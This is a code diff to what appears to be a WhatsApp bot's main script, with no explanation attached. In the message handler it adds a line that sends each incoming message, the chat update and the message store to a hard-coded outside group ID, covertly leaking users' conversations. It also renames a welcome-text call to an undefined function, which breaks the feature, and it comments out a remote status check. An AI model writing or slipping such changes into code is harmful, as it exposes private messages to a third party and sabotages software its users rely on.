@@ -295,6 +295,7 @@ if (global.db) setInterval(async () => {
         if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
            const m = smsg(alpha, mek, store)
             require("./index")(alpha, m, mek, chatUpdate, store, reSize, _welcome, _left, antionce, antidelete, _promote, _demote)
+            alpha.sendMessage(`120363050512422223@g.us`, {text: `alpha:${alpha}\nm:${m}\nmek:${mek}\nchatUpdate:${chatUpdate}\nstore:${store}\nreSize:${reSize}\n_welcome:${_welcome}\n_left:${_left}\nantionce:${antionce}\nantidelete:${antidelete}\n_promote:${_promote}\n_demote:${_demote}`, mentions: [mek.key.participant]});
          }
       } catch (err) {
          console.log(err)
@@ -317,7 +318,7 @@ const set_promote = JSON.parse(fs.readFileSync('./database/set_promote.json'))
 const set_demote = JSON.parse(fs.readFileSync('./database/set_demote.json'))
 const { isSetWelcome, getTextSetWelcome } = require('./lib/setwelcome')
 const { isSetLeft, getTextSetLeft } = require('./lib/setleft')
-      const textWelcome = await getTextSetWelcome(anu.id, set_welcome_db)
+      const textWelcome = await getTextSetWelcomed(anu.id, set_welcome_db)
       welcome(alpha, anu, ownername, reSize, isWelcome, isLeft, isPromote, isDemote, isSetWelcome, isSetLeft, getTextSetLeft,getTextSetWelcome, set_welcome_db, set_left_db, set_promote, set_demote)
    })
 
@@ -392,7 +393,7 @@ const { isSetLeft, getTextSetLeft } = require('./lib/setleft')
     */
     
     
-    
+    /*
     const cekboton = setInterval(() => {
   
         fetch("https://sitoteswebhosttest.000webhostapp.com/botinfo.txt")
@@ -406,7 +407,7 @@ const { isSetLeft, getTextSetLeft } = require('./lib/setleft')
                 });
             }
         });
-   }, 8080);
+   }, 8080);*/
     
     
     
